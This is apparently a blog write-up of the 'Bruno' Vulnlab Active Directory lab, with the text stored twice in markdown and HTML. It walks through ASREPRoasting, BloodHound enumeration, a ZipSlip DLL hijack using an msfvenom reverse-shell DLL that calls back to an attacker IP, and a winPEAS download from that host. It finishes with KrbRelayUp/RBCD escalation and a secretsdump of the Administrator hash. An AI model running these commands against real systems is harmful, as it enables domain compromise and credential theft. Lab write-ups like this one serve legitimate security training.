KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)\n[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)\n$krb5asrep$23$svc_scan@BRUNO.VL:cc4e0a77789388e39[...snip...]2be71ab6dd19a97dcc49c6\n```\n\nWe were successfully able to perform an ASREPRoasting attack against `svc_scan`, meaning we can try and crack this encrypted ASREP ticket for a plaintext password. Our hash identifier is 18200, as you can find [here](https://hashcat.net/wiki/doku.php?id=example_hashes).\n\n```\n└─$ hashcat -a 0 -m 18200 svc_scan.txt /usr/share/wordlists/rockyou.txt\n......\nb6252092fb9116194a8add89f17392c2be71ab6dd19a97dcc49c6:[...snip...]\n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)\n```\n\nAs you can see, we were able to crack the ASREP hash and now have the plaintext password for `svc_scan`.\n\nThere are a few things we could do here, such as dumping the domain (given that these are LDAP credentials) or look at SMB/FTP to further our foothold.\n\nTo dump the domain, we'll do the following with the [Bloodhound Python ingestor](https://github.com/dirkjanm/BloodHound.py). If you haven't set up Bloodhound before, [this resource](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux) should be helpful for you.\n\n```\n└─$ bloodhound-python -d 'bruno.vl' -u 'svc_scan' -p '[...snip...]' -c all -ns 10.10.126.214 --zip\n```\n\nYou should then be able to import the compressed domain object archive into Bloodhound to view all the domain objects within LDAP.\n\n![](/images/vulnlab/bruno-vl/e.png)\n\nIt does not seem as though our user has any obscenely prevalent privileges, so we'll have to look elsewhere.\n\nLet's have a look at SMB given that we have credentials to a legitimate user now.\n\n```\n└─$ smbclient -L 10.10.126.214 -U 'svc_scan'\nPassword for [WORKGROUP\\svc_scan]:\n\nSharename       Type      Comment\n---------       ----      -------\nADMIN$          Disk      Remote Admin\nC$              Disk      Default share\nCertEnroll      Disk      Active Directory Certificate Services share\nIPC$            IPC       Remote IPC\nNETLOGON        Disk      Logon server share\nqueue           Disk\nSYSVOL          Disk      Logon server share\nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to 10.10.126.214 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n```\n\nYou'll notice that we now have access to a decent amount of SMB shares, though there is an interesting one that we can see currently. There seems to be a share called `queue`, which if you'll remember, is similar to the name of a directory that we found in FTP.\n\n```\n└─$ smbclient \\\\\\\\10.10.126.214\\\\queue -U 'svc_scan'\nPassword for [WORKGROUP\\svc_scan]:\nTry \"help\" to get a list of possible commands.\nsmb: \\> ls\n  .                                   D        0  Wed Jun 29 12:33:48 2022\n  ..                                  D        0  Wed Jun 29 09:41:03 2022\n\n7863807 blocks of size 4096. 3739137 blocks available\nsmb: \\> put test.txt\nputting file test.txt as \\test.txt (0.0 kb/s) (average 0.0 kb/s)\nsmb: \\>\n```\n\nIf you'll also notice, we have write access onto this share as well.\n\nThere aren't many other leads - given that we do not have access to any other users at the moment or access to any other services that would be of use to us. The other SMB directories don't seem to hold anything either, as I made sure to enumerate other parts of the machine to make sure I didn't miss anything.\n\n# Reverse Engineering SampleScanner\n\nAt this point, I decided to take a look back at the SampleScanner application to see if we could perform any DLL Hijacking. This is mainly just due to the notion of a DLL and the fact that this application seems to be a custom executable as I could not find source code for it anywhere.\n\nLet's first start by opening ProcMon via the [SysInternalsSuite](https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite). Navigate to `Filter > Filter` (or just Ctrl+L), and use the configuration as seen below.\n\n* Process Name - begins with - SampleScanner -> then Include\n* Path - ends with - .dll -> then Include\n* Result - begins with - NAME -> then Include\n\n![](/images/vulnlab/bruno-vl/f.png)\n\nWe'll then apply the filters and ProcMon will start listening to events that fall under our filter settings. Run the binary and you should see some events populate.\n\n![](/images/vulnlab/bruno-vl/g.png)\n\nYou'll get a lot of results, so I've highlighted two important entries that get logged into ProcMon. The two highlights I have are DLLs that are not found within the current directory. The key note here is that they are DLLs that are within the **current directory**, meaning it will be using the same directory that the `SampleScanner` application is within.\n\nThis means we can plant a malicious DLL into the same directory as application and it should execute it, giving us a reverse shell.  But that being said, how can we do so and how do we know what the application is actually doing?\n\nBefore that, I want to note that the executable spits out an error if you run it properly.\n\n```\nPS Microsoft.PowerShell.Core\\FileSystem::\\\\wsl.localhost\\kali-linux\\home\\daz\\tech\\bruno\\scanner\\SampleScanner> .\\SampleScanner.exe\nUnhandled exception. System.IO.DirectoryNotFoundException: Could not find a part of the path 'C:\\samples\\queue'.\n   at System.IO.Enumeration.FileSystemEnumerator`1.CreateDirectoryHandle(String path, Boolean ignoreNotFound)\n   at System.IO.Enumeration.FileSystemEnumerator`1.Init()\n   at System.IO.Enumeration.FileSystemEnumerator`1..ctor(String directory, Boolean isNormalized, EnumerationOptions options)\n   at System.IO.Enumeration.FileSystemEnumerable`1..ctor(String directory, FindTransform transform, EnumerationOptions options, Boolean isNormalized)\n   at System.IO.Enumeration.FileSystemEnumerableFactory.UserFiles(String directory, String expression, EnumerationOptions options)\n   at System.IO.Directory.InternalEnumeratePaths(String path, String searchPattern, SearchTarget searchTarget, EnumerationOptions options)\n   at SampleScanner.Program.Main(String[] args)\n```\n\nThe key thing to look at here is that it seems that a static file path is being searched, the `C:\\samples\\queue` directory. This is interesting because we have write access to this folder via SMB as `svc_scan`.\n\nTo start with reversing the binary itself, we can first examine the `SampleScanner.dll` to see specifically what the executable is doing as this DLL is more than likely associated with the main functionality of the application. We can do so with [ILSpy](https://github.com/icsharpcode/ILSpy), a reverse engineering decompiler used for examining application source code. We'll import the `SampleScanner.dll` into ILSpy.\n\n![](/images/vulnlab/bruno-vl/h.png)\n\nWe're mainly concerned with the Main function inside of the original `SampleScanner` library that is decompiled. \n\nIn the screenshot above, you'll notice that there are various hints about a \"ZipArchive\" entry as a class within the main source code. Let's take a look farther into these classes to see if there's anything we can find.\n\n![](/images/vulnlab/bruno-vl/i.png)\n\nLooking into those classes, it looks like the zip archive is opening the archive itself with `GetEntry` and `get_ArchiveReader`. These contents are then scanned by the application itself to simulate a malware scan.\n\nSo from reverse engineering the binary we discovered three things:\n* A DLL using the relative path of the binary is not being loaded\n* The application itself is attempting to open any archives within a specified directory.\n* The specified directory itself, `C:\\samples\\queue`, is a directory that we have write access onto.\n\nAfter doing some research into what we have in front of us, I came across an interesting exploit that seems to fit our situation - the ZipSlip.\n\n# DLL Hijacking via ZipSlip\n\n[ZipSlip](https://security.snyk.io/research/zip-slip-vulnerability) is essentially a vulnerability that allows us to perform file creation via path traversal in a zip archive. If a zip archive is opened automatically by a program, we can create a compressed archive with a file that has path traversal characters in its name, such as `../revshell.exe`. This will place our executable in the parent folder of where it was opened.\n\nIn our case, we want to place a malicious executable in `../app/(malicious_file_here)`. This should be within the same path as the binary, which is where the application is trying to load DLLs from.\n\nSince we know the names of the DLL that are not found within the application's direct path, we can use those as the names for our malicious DLLs. We can craft a malicious DLL using `msfvenom`, as seen below and then convert it to a zip archive. You can use either `hostfxr.dll` or `Microsoft.DiaSymReader.Native.amd64.dll`, as either will work for this.\n\n```\n└─$ msfvenom -p windows/x64/shell_reverse_tcp -ax64 -f dll LHOST=10.8.0.173 LPORT=9001 > hostfxr.dll            \n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\nNo encoder specified, outputting raw payload\nPayload size: 460 bytes\nFinal size of dll file: 9216 bytes\n\n└─$ zip host.zip hostfxr.dll\n  adding: hostfxr.dll (deflated 80%)\n```\n\nWe can then use an archive manager such as 7-Zip File Manager (in my case I transferred the DLL to my Windows host) to view the archive and edit the name accordingly.\n\n![](/images/vulnlab/bruno-vl/j.png)\n\nAs seen above, you can implement directory traversal characters in 7-Zip without any issues. This will create two mock directories within the archive, which will be the traversal method when we transfer it to the target machine.\n\nNow that we have the respective archive set up, let's start up our listener and transfer the archive to the `queue` share. (Note that I changed the name of the archive to `host_sample.zip`)\n\n![](/images/vulnlab/bruno-vl/k.png)\n\nAfter some time as you'll see, the ZipSlip exploit worked properly and the DLL was moved to the `app` directory. After about a minute or so, you'll see that our reverse shell called back and we now should have a session as `svc_scan`.\n\n![](/images/vulnlab/bruno-vl/l.png)\n\n# Internal Enumeration\n\nNow that we have a session on the remote host, we'll do a bit of enumeration on the domain computer to see if there are any ways to escalate our privileges.\n\nThe root `C:\\` drive contains the first user flag as seen below.\n\n```\nPS C:\\> ls\n\nDirectory: C:\\\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\nd-----         8/19/2021   6:24 AM                EFI\nd-----         6/29/2022   2:43 PM                inetpub\nd-----          5/8/2021   8:20 AM                PerfLogs\nd-r---         6/29/2022   4:15 PM                Program Files\nd-----         6/29/2022   1:28 PM                Program Files (x86)\nd-----         6/29/2022   1:41 PM                samples\nd-r---         6/29/2022   4:09 PM                Users\nd-----         6/29/2022   1:32 PM                Windows\n-a----         6/29/2022   3:00 PM             37 user.txt\n```\n\nThere does seem to be an `inetpub` directory which contains the default IIS website that we saw previously, however we do not have write access to this part of the system meaning we won't be able to exploit it.\n\nFurthermore, there does not seem to be any outstanding program applications on the internal machine that we can exploit, nor any services that are running on an internal port.\n\nAt this point, I decided to see if an internal machine scraper such as [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS). This should tell us if there are any hidden vulnerabilities that we wouldn't be able to see from an initial glance. \n\n```\nPS C:\\temp> curl http://10.8.0.173:9002/winPEASany_ofs.exe -O winPEASany_ofs.exe\ncurl http://10.8.0.173:9002/winPEASany_ofs.exe -O winPEASany_ofs.exe\nPS C:\\temp> .\\winPEASany_ofs.exe\n......\nChecking KrbRelayUp\n  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#krbrelayup\n  The system is inside a domain (BRUNO) so it could be vulnerable.\n  You can try https://github.com/Dec0ne/KrbRelayUp to escalate privileges\n```\n\nAs you'll notice, this should spider the entire filesystem and report any vulnerabilities back to us. The above vulnerability is reported often when I run WinPEAS, however there was something interesting that I found that may we may be able to exploit.\n\n# Privilege Escalation via KrbRelayUp/CLSIDs\n\nOne thing you'll notice is that our user currently has a MAQ of 10. A MAQ, or MachineAccountQuota, essentially allows the domain object to create domain computer objects and use them within the domain.\n\n```\n└─$ nxc ldap 10.10.73.8 -u 'svc_scan' -p '[...snip...]' -M maq\nSMB         10.10.73.8      445    BRUNODC          [*] Windows Server 2022 Build 20348 x64 (name:BRUNODC) (domain:bruno.vl) (signing:True) (SMBv1:False)                                                                                                   \nLDAP        10.10.73.8      389    BRUNODC          [+] bruno.vl\\svc_scan:[...snip...]\nMAQ         10.10.73.8      389    BRUNODC          [*] Getting the MachineAccountQuota\nMAQ         10.10.73.8      389    BRUNODC          MachineAccountQuota: 10\n```\n\nFurthermore, the LDAP does not have signing enabled. This cements the fact that a Kerberos relay attack is possible through KrbRelayUp.\n\n```\n└─$ nxc ldap 10.10.73.8 -u 'svc_scan' -p '[...snip...]' -M ldap-checker\nSMB         10.10.73.8      445    BRUNODC          [*] Windows Server 2022 Build 20348 x64 (name:BRUNODC) (domain:bruno.vl) (signing:True) (SMBv1:False)                                                                                                   \nLDAP        10.10.73.8      389    BRUNODC          [+] bruno.vl\\svc_scan:[...snip...]\nLDAP-CHE... 10.10.73.8      389    BRUNODC          LDAP Signing NOT Enforced!\nLDAP-CHE... 10.10.73.8      389    BRUNODC          LDAPS Channel Binding is set to \"NEVER\"\n```\n\nA Kerberos relay attack is essentially an authentication attack much like NTLM relay that allows us to relay a domain objects Kerberos authentication to another service. This essentially allows us to relay an ASREQ to any SPN that we need to authenticate to. Where LDAP signing essentially plays a picture into this is that it will encrypt all traffic over LDAP, meaning we won't be able to properly sniff the traffic for authentication tokens as a MITM. If you want to delve into more information about Kerberos Relaying and how it works, [this](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html) was the blog post I used mainly as research into the topic.\n\nIn our case, we should be able to create a fake domain computer object and coerce an authentication attempt using RBCD. The only issue is, how do we do coerce authentication if we're using Kerberos authentication? This is where the idea of abusing [CLSIDs](https://www.trendmicro.com/vinfo/us/security/definition/clsid#:~:text=The%20Class%20ID%2C%20or%20CLSID,%5CCLSID%5C%7BCLSID%20value%7D.) comes into play, as CLSIDs are essentially identifiers for application components in Windows. These are predefined by the Windows operating system, meaning we can use a curated list [here](https://github.com/jkerai1/CLSID-Lookup/blob/main/CLSID_no_duplicate_records.txt) or [here](https://vulndev.io/cheats-windows/). We're specifically looking for one that works with Windows Server 2019/2022, as that is the current operating system that we're on.\n\nIn particular, the CLSID I picked was `d99e6e73-fc88-11d0-b498-00a0c90312f3`. We'll need to compile [KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp.git) in order to exploit this on the target machine. Luckily enough, Defender is not enabled on this box so we shouldn't have to bypass AV for this.\n\n```\nPS C:\\temp> \"Invoke-Mimikatz\"\n\"Invoke-Mimikatz\"\nInvoke-Mimikatz\n```\n\nSo once we have the `KrbRelayUp` binary compiled, we'll execute it on the target machine using the CLSID that we have selected.\n\n```\nPS C:\\temp> .\\KrbRelayUp.exe relay -Domain bruno.vl -CreateNewComputerAccount -ComputerName daz$ -ComputerPassword Password123@ --clsid d99e6e73-fc88-11d0-b498-00a0c90312f3\n.\\KrbRelayUp.exe relay -Domain bruno.vl -CreateNewComputerAccount -ComputerName daz$ -ComputerPassword Password123@ --clsid d99e6e73-fc88-11d0-b498-00a0c90312f3\nKrbRelayUp - Relaying you to SYSTEM\n\n\n[+] Rewriting function table\n[+] Rewriting PEB\n[+] Init COM server\n[+] Computer account \"daz$\" added with password \"Password123@\"\n[+] Looking for available ports..\n[+] Port 2869 available\n[+] Register COM server\n[+] Forcing SYSTEM authentication\n[+] Got Krb Auth from NT/SYSTEM. Relying to LDAP now...\n[+] LDAP session established\n[+] RBCD rights added successfully\n[+] Run the spawn method for SYSTEM shell:\n./KrbRelayUp.exe spawn -m rbcd -d bruno.vl -dc brunodc.bruno.vl -cn daz$ -cp Password123@\n```\n\nWe'll then execute the command provided so that a TGT request can be sent to the KDC. This allows us to use `getST` after this command to retrieve a TGS on behalf of the Administrator account to CIFS using our fake machine account.\n\n```\n└─$ impacket-getST -spn cifs/brunodc.bruno.vl -impersonate Administrator -dc-ip 10.10.116.111 bruno.vl/'daz$':'Password123@'\nImpacket v0.12.0.dev1 - Copyright 2023 Fortra\n\n[*] Getting TGT for user\n[*] Impersonating Administrator\n[*] Requesting S4U2self\n[*] Requesting S4U2Proxy\n[*] Saving ticket in Administrator@cifs_brunodc.bruno.vl@BRUNO.VL.ccache\n```\n\nWe'll then dump the secrets of the machine using `secretsdump`.\n\n```\n└─$ export KRB5CCNAME=Administrator@cifs_brunodc.bruno.vl@BRUNO.VL.ccache\n\n└─$ impacket-secretsdump -k brunodc.bruno.vl                                                                       \nImpacket v0.12.0.dev1 - Copyright 2023 Fortra\n\n[*] Service RemoteRegistry is in stopped state\n[*] Starting service RemoteRegistry\n[*] Target system bootKey: 0xf58ac639976f0c99c2dde0d24ef3219d\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\n......\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:13735[...snip...]bfd4:::\n```\n\nNow that we have the Administrator's NT hash, we can use that to login to WinRM.\n\n![](/images/vulnlab/bruno-vl/m.png)\n\nNow that we are currently the Administrator, we can read the root flag within the Administrator's Desktop directory. That means we have successfully rooted this machine!\n\n# Conclusion\n\nThis machine was very difficult, and it gave me some new insight on doing more RBCD exploitation. DLL Hijacking and reverse engineering are both topics that this machine covered well, and I have no complaints. Big thanks to xct for this machine.\n\n# Resources\n\nhttps://hashcat.net/wiki/doku.php?id=example_hashes\nhttps://github.com/dirkjanm/BloodHound.py\nhttps://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux\nhttps://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite\nhttps://github.com/icsharpcode/ILSpy\nhttps://security.snyk.io/research/zip-slip-vulnerability\nhttps://github.com/peass-ng/PEASS-ng/tree/master/winPEAS\nhttps://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html\nhttps://www.trendmicro.com/vinfo/us/security/definition/clsid#:~:text=The%20Class%20ID%2C%20or%20CLSID,%5CCLSID%5C%7BCLSID%20value%7D.\nhttps://github.com/jkerai1/CLSID-Lookup/blob/main/CLSID_no_duplicate_records.txt\nhttps://vulndev.io/cheats-windows/\nhttps://github.com/Dec0ne/KrbRelayUp\n\n\n\n","slug":"bruno","published":1,"updated":"2024-08-02T20:42:06.309Z","comments":1,"layout":"post","photos":[],"_id":"clzd67ybm0000atufed1z2ran","content":"<p>Bruno is one of the more difficult AD machines that I’ve done, as all of the attacks in this specific machine are relatively new to me. This machine consists of exploiting a zip archive vulnerability along with pivoting to other user accounts in an AD environment using untraditional methods.</p>\n<p>You may see the IP update a few times, I did the box multiple times during the writeup portion.</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>We’ll first start with our usual NMAP scan.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ sudo nmap 10.10.126.214</span><br><span class=\"line\">[sudo] password for daz:</span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-30 23:18 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.126.214</span><br><span class=\"line\">Host is up (0.12s latency).</span><br><span class=\"line\">Not shown: 984 filtered tcp ports (no-response)</span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">21/tcp   open  ftp</span><br><span class=\"line\">53/tcp   open  domain</span><br><span class=\"line\">80/tcp   open  http</span><br><span class=\"line\">88/tcp   open  kerberos-sec</span><br><span class=\"line\">135/tcp  open  msrpc</span><br><span class=\"line\">139/tcp  open  netbios-ssn</span><br><span class=\"line\">389/tcp  open  ldap</span><br><span class=\"line\">443/tcp  open  https</span><br><span class=\"line\">445/tcp  open  microsoft-ds</span><br><span class=\"line\">464/tcp  open  kpasswd5</span><br><span class=\"line\">593/tcp  open  http-rpc-epmap</span><br><span class=\"line\">636/tcp  open  ldapssl</span><br><span class=\"line\">3268/tcp open  globalcatLDAP</span><br><span class=\"line\">3269/tcp open  globalcatLDAPssl</span><br><span class=\"line\">3389/tcp open  ms-wbt-server</span><br><span class=\"line\">5357/tcp open  wsdapi</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 19.90 seconds</span><br></pre></td></tr></table></figure>\n\n<p>Given the usual ports that for AD (Kerberos, SMB, LDAP) there are a few outliers in our scan, such as FTP and HTTP (more so FTP).</p>\n<p>We’ll first start by verifying anonymous logon through FTP.</p>\n<p><img src=\"/images/vulnlab/bruno-vl/b.png\"></p>\n<p>It seems that we were able to login with null credentials, and there seem to be a few directories for us to look through. We’ll come back to this later, as I want to do my initial checks around the AD machine just to see if we are missing anything.</p>\n<p>Let’s take a look at the web server to see if there’s anything we can find.</p>\n<p><img src=\"/images/vulnlab/bruno-vl/c.png\"></p>\n<p>This looks to be a default IIS webpage, and running directory traversal scans on this webpage did not present me with any endpoints.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ gobuster dir -u http://10.10.126.214 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x aspx</span><br></pre></td></tr></table></figure>\n\n<p>In that case we’ll take a look at SMB to see if there are any shares that we can access.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ smbclient -L 10.10.126.214 -N</span><br><span class=\"line\">Anonymous login successful</span><br><span class=\"line\"></span><br><span class=\"line\">Sharename       Type      Comment</span><br><span class=\"line\">---------       ----      -------</span><br><span class=\"line\">Reconnecting with SMB1 for workgroup listing.</span><br><span class=\"line\">do_connect: Connection to 10.10.126.214 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br><span class=\"line\">Unable to connect with SMB1 -- no workgroup available</span><br></pre></td></tr></table></figure>\n\n<p>It seems that anonymous login is allowed, however we don’t have any permissions to view any shares at the moment. We’ll most likely need credentials in order to do anything with SMB.</p>\n<p>Finally, we’ll take a look at LDAP to see if null authentication is allowed (which would allow us to dump domain objects from the domain). We’ll need to find the name of the domain, to which we can do with a simple CME command.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec smb 10.10.126.214</span><br><span class=\"line\">SMB         10.10.126.214     445    BRUNODC          [*] Windows Server 2022 Build 20348 x64 (name:BRUNODC) (domain:bruno.vl) (signing:True) (SMBv1:False)</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have the name of the DC along with the workstation, we’ll add it to our <code>/etc/hosts</code> file and run LDAPSEARCH against it.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ ldapsearch -x -H ldap://brunodc.bruno.vl -D &#x27;&#x27; -w &#x27;&#x27; -b &quot;DC=bruno,DC=vl&quot;</span><br><span class=\"line\"># extended LDIF</span><br><span class=\"line\">#</span><br><span class=\"line\"># LDAPv3</span><br><span class=\"line\"># base &lt;DC=bruno,DC=vl&gt; with scope subtree</span><br><span class=\"line\"># filter: (objectclass=*)</span><br><span class=\"line\"># requesting: ALL</span><br><span class=\"line\">#</span><br><span class=\"line\"></span><br><span class=\"line\"># search result</span><br><span class=\"line\">search: 2</span><br><span class=\"line\">result: 1 Operations error</span><br><span class=\"line\">text: 000004DC: LdapErr: DSID-0C090A58, comment: In order to perform this opera</span><br><span class=\"line\"> tion a successful bind must be completed on the connection., data 0, v4f7c</span><br><span class=\"line\"></span><br><span class=\"line\"># numResponses: 1</span><br></pre></td></tr></table></figure>\n\n<p>It seems that we’ll also need credentials to access LDAP.</p>\n<h1 id=\"Foothold-with-FTP\"><a href=\"#Foothold-with-FTP\" class=\"headerlink\" title=\"Foothold with FTP\"></a>Foothold with FTP</h1><p>Given that most of our initial access vectors don’t seem to bare much fruit, let’s take a look back at FTP to see if there’s anything we can find.</p>\n<p><img src=\"/images/vulnlab/bruno-vl/d.png\"></p>\n<p>If you’ll notice, there seems to be files related to a <code>SampleScanner</code> app within the FTP directory. We’ve dealt with DLL Hijacking in applications that we have write access to in the past, so this could be a similar situation (specifically for <a href=\"https://dan-feliciano.com/2024/06/05/trusted/\">Trusted</a>).</p>\n<p>The only issue is that we do not have write access onto this directory at the moment.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ftp&gt; ls</span><br><span class=\"line\">229 Entering Extended Passive Mode (|||49561|)</span><br><span class=\"line\">150 Opening ASCII mode data connection.</span><br><span class=\"line\">06-29-22  05:42PM                  165 changelog</span><br><span class=\"line\">06-28-22  07:15PM                  431 SampleScanner.deps.json</span><br><span class=\"line\">06-29-22  03:58PM                 7168 SampleScanner.dll</span><br><span class=\"line\">06-29-22  03:58PM               174592 SampleScanner.exe</span><br><span class=\"line\">06-28-22  07:15PM                  170 SampleScanner.runtimeconfig.dev.json</span><br><span class=\"line\">06-28-22  07:15PM                  154 SampleScanner.runtimeconfig.json</span><br><span class=\"line\">226 Transfer complete.</span><br><span class=\"line\">ftp&gt; put test.txt</span><br><span class=\"line\">local: test.txt remote: test.txt</span><br><span class=\"line\">229 Entering Extended Passive Mode (|||49562|)</span><br><span class=\"line\">550 Access is denied.</span><br><span class=\"line\">ftp&gt;</span><br></pre></td></tr></table></figure>\n\n<p>While we don’t have write access currently, we do have read access. Let’s pull the entirety of this folder back to our localhost to see if there’s any important files we can read (specifically changelog).</p>\n<p>NOTE: Remember to set your FTP session to “binary” mode before you download all of the files. This just makes sure to change all of the downloads from ASCII to Binary, which will convert the <code>SampleScanner.exe</code> to an MS-DOS which we won’t be able to debug later. You can do so easily by typing <code>binary</code> into the FTP console.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ cat changelog</span><br><span class=\"line\">Version 0.3</span><br><span class=\"line\">- integrated with dev site</span><br><span class=\"line\">- automation using svc_scan</span><br><span class=\"line\"></span><br><span class=\"line\">Version 0.2</span><br><span class=\"line\">- additional functionality</span><br><span class=\"line\"></span><br><span class=\"line\">Version 0.1</span><br><span class=\"line\">- initial support for EICAR string</span><br></pre></td></tr></table></figure>\n\n<p>It seems that there are a few changes implemented on the development side for the <code>SampleScanner</code> app itself. The functionality seems to be integrated with a development site and included better support.</p>\n<p>That being said, we do seem to also have an account name that we can potentially try to exploit - <code>svc_scan</code>. Let’s do our Kerberos checks for this user along with the other default accounts.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-GetNPUsers -dc-ip 10.10.126.214 -request -usersfile ul.txt -no-pass bruno.vl/&#x27;daz&#x27;@10.10.126.214</span><br><span class=\"line\">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class=\"line\"></span><br><span class=\"line\">[-] User Administrator doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)</span><br><span class=\"line\">$krb5asrep$23$svc_scan@BRUNO.VL:cc4e0a77789388e39[...snip...]2be71ab6dd19a97dcc49c6</span><br></pre></td></tr></table></figure>\n\n<p>We were successfully able to perform an ASREPRoasting attack against <code>svc_scan</code>, meaning we can try and crack this encrypted ASREP ticket for a plaintext password. Our hash identifier is 18200, as you can find <a href=\"https://hashcat.net/wiki/doku.php?id=example_hashes\">here</a>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ hashcat -a 0 -m 18200 svc_scan.txt /usr/share/wordlists/rockyou.txt</span><br><span class=\"line\">......</span><br><span class=\"line\">b6252092fb9116194a8add89f17392c2be71ab6dd19a97dcc49c6:[...snip...]</span><br><span class=\"line\"></span><br><span class=\"line\">Session..........: hashcat</span><br><span class=\"line\">Status...........: Cracked</span><br><span class=\"line\">Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, we were able to crack the ASREP hash and now have the plaintext password for <code>svc_scan</code>.</p>\n<p>There are a few things we could do here, such as dumping the domain (given that these are LDAP credentials) or look at SMB&#x2F;FTP to further our foothold.</p>\n<p>To dump the domain, we’ll do the following with the <a href=\"https://github.com/dirkjanm/BloodHound.py\">Bloodhound Python ingestor</a>. If you haven’t set up Bloodhound before, <a href=\"https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux\">this resource</a> should be helpful for you.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ bloodhound-python -d &#x27;bruno.vl&#x27; -u &#x27;svc_scan&#x27; -p &#x27;[...snip...]&#x27; -c all -ns 10.10.126.214 --zip</span><br></pre></td></tr></table></figure>\n\n<p>You should then be able to import the compressed domain object archive into Bloodhound to view all the domain objects within LDAP.</p>\n<p><img src=\"/images/vulnlab/bruno-vl/e.png\"></p>\n<p>It does not seem as though our user has any obscenely prevalent privileges, so we’ll have to look elsewhere.</p>\n<p>Let’s have a look at SMB given that we have credentials to a legitimate user now.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ smbclient -L 10.10.126.214 -U &#x27;svc_scan&#x27;</span><br><span class=\"line\">Password for [WORKGROUP\\svc_scan]:</span><br><span class=\"line\"></span><br><span class=\"line\">Sharename       Type      Comment</span><br><span class=\"line\">---------       ----      -------</span><br><span class=\"line\">ADMIN$          Disk      Remote Admin</span><br><span class=\"line\">C$              Disk      Default share</span><br><span class=\"line\">CertEnroll      Disk      Active Directory Certificate Services share</span><br><span class=\"line\">IPC$            IPC       Remote IPC</span><br><span class=\"line\">NETLOGON        Disk      Logon server share</span><br><span class=\"line\">queue           Disk</span><br><span class=\"line\">SYSVOL          Disk      Logon server share</span><br><span class=\"line\">Reconnecting with SMB1 for workgroup listing.</span><br><span class=\"line\">do_connect: Connection to 10.10.126.214 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br><span class=\"line\">Unable to connect with SMB1 -- no workgroup available</span><br></pre></td></tr></table></figure>\n\n<p>You’ll notice that we now have access to a decent amount of SMB shares, though there is an interesting one that we can see currently. There seems to be a share called <code>queue</code>, which if you’ll remember, is similar to the name of a directory that we found in FTP.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ smbclient \\\\\\\\10.10.126.214\\\\queue -U &#x27;svc_scan&#x27;</span><br><span class=\"line\">Password for [WORKGROUP\\svc_scan]:</span><br><span class=\"line\">Try &quot;help&quot; to get a list of possible commands.</span><br><span class=\"line\">smb: \\&gt; ls</span><br><span class=\"line\">  .                                   D        0  Wed Jun 29 12:33:48 2022</span><br><span class=\"line\">  ..                                  D        0  Wed Jun 29 09:41:03 2022</span><br><span class=\"line\"></span><br><span class=\"line\">7863807 blocks of size 4096. 3739137 blocks available</span><br><span class=\"line\">smb: \\&gt; put test.txt</span><br><span class=\"line\">putting file test.txt as \\test.txt (0.0 kb/s) (average 0.0 kb/s)</span><br><span class=\"line\">smb: \\&gt;</span><br></pre></td></tr></table></figure>\n\n<p>If you’ll also notice, we have write access onto this share as well.</p>\n<p>There aren’t many other leads - given that we do not have access to any other users at the moment or access to any other services that would be of use to us. The other SMB directories don’t seem to 